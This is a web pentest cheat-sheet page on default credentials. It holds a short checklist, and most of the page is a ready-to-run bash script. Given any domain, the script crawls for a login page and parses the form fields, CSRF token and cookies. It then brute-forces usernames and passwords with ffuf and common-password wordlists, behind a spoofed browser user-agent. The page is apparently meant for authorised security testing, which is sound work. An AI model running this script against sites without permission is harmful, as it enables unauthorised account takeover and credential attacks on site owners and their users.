# Default Credentials

## Check List

* [ ] _Determine whether the application has any user accounts with default passwords._
* [ ] _Review whether new user accounts are created with weak or predictable passwords._

## Cheat Sheet

### Error Message <a href="#error-message" id="error-message"></a>

#### [FFUF](https://github.com/ffuf/ffuf)

_Create Script_

```bash
sudo nano default-bruteforce.sh
```

```bash
#!/bin/bash

# Check if URL is provided
if [ $# -eq 0 ]; then
    echo "Usage: $0 <domain.com>"
    exit 1
fi

URL="$1"
USERLIST="/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
PASSLIST="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"

# Crawl and filter login pages
LOGIN=$(katana -u "$URL" -depth 3 -silent | \
grep -iE "/(login|signin|my-account|account|wp-login\.php)(/)?$" | \
grep -viE "lost-password|register|signup|\.(js|css|jpg|png|gif|svg|ico)$" | \
sed 's:[/?]*$::' | sort -u | head -n1)

# Fetch login page HTML
HTML=$(curl -s "$LOGIN")

# Extract the first form block (up to </form>)
FORM=$(echo "$HTML" | sed -n '/<form/,/<\/form>/p' | head -n 100)

# Extract form action attribute (default to "/")
ACTION=$(echo "$FORM" | grep -oEi 'action="[^"]*"' | head -1 | cut -d'"' -f2)
if [ -z "$ACTION" ]; then
    ACTION="$LOGIN"
fi

# Extract form method (default to POST, not GET!)
METHOD=$(echo "$FORM" | grep -oEi 'method="[^"]+"' | head -1 | cut -d'"' -f2 | tr '[:upper:]' '[:lower:]')
if [ -z "$METHOD" ]; then
    METHOD="post"
fi

# Construct full action URL
if [[ "$ACTION" == /* ]]; then
    BASE_URL=$(echo "$URL" | sed 's|^\(https\?://[^/]*\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
elif [[ "$ACTION" =~ ^https?:// ]]; then
    FULL_ACTION="$ACTION"
else
    BASE_URL=$(echo "$LOGIN" | sed 's|\(https\?://.*/\).*|\1|')
    FULL_ACTION="${BASE_URL}${ACTION}"
fi

# Extract username and password field names
USERNAME_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'user|username|login|email' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')
PASSWORD_FIELD=$(echo "$FORM" | grep -oEi '<input[^>]*name="[^"]+"' | grep -Ei 'pass|password|pwd' | head -1 | sed -E 's/.*name="([^"]+)".*/\1/')

if [ -z "$USERNAME_FIELD" ]; then USERNAME_FIELD="username"; fi
if [ -z "$PASSWORD_FIELD" ]; then PASSWORD_FIELD="password"; fi

# Extract CSRF token (if exists)
CSRF_FIELD=$(echo "$FORM" | grep -oiP '<input[^>]+name="\K[^"]*(csrf|token|nonce)[^"]*' | head -1)
CSRF_VALUE=""
if [ -n "$CSRF_FIELD" ]; then
    CSRF_VALUE=$(echo "$FORM" | grep -oiP "<input[^>]+name=\"$CSRF_FIELD\"[^>]*>" | grep -oiP 'value="\K[^"]+')
fi

# Prepare POST data
DATA="${USERNAME_FIELD}=FUZZ1&${PASSWORD_FIELD}=FUZZ2"
if [ -n "$CSRF_FIELD" ] && [ -n "$CSRF_VALUE" ]; then
    DATA="${CSRF_FIELD}=${CSRF_VALUE}&${DATA}"
fi

# Extract cookies
COOKIES=$(curl -s -I "$LOGIN" | grep -i '^Set-Cookie:' | sed -E 's/^Set-Cookie: //I' | tr -d '\r\n')

# Headers
HEADERS=(
  -H "Content-Type: application/x-www-form-urlencoded"
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0"
  -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
  -H "Accept-Language: en-US,en;q=0.5"
  -H "Accept-Encoding: gzip, deflate"
  -H "Connection: keep-alive"
  -H "Upgrade-Insecure-Requests: 1"
  -H "Referer: $LOGIN"
)
if [ -n "$COOKIES" ]; then
    HEADERS+=(-H "Cookie: $COOKIES")
fi

# Run ffuf with constructed parameters
if [[ "$METHOD" == "get" ]]; then
    FFUF_URL="${FULL_ACTION}?${DATA}"
    ffuf -u "$FFUF_URL" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -X GET \
         -ac -c -r \
         -mc 200 \
         -fr "invalid username|invalid password|login failed|authentication failed|unauthorized|access denied| نام کاربری یا رمز عبور معتبر نیست" \
         "${HEADERS[@]}"
else
    ffuf -u "$FULL_ACTION" \
         -w "$USERLIST:FUZZ1" \
         -w "$PASSLIST:FUZZ2" \
         -X POST \
         -d "$DATA" \
         -ac -c -r \
         -mc 200 \
         -fr "invalid username|invalid password|login failed|authentication failed|unauthorized|access denied| نام کاربری یا رمز عبور معتبر نیست" \
         "${HEADERS[@]}"
fi
```

_Run Script_

```bash
sudo chmod +x default-bruteforce;sudo ./default-bruteforce.sh $WEBSITE
```
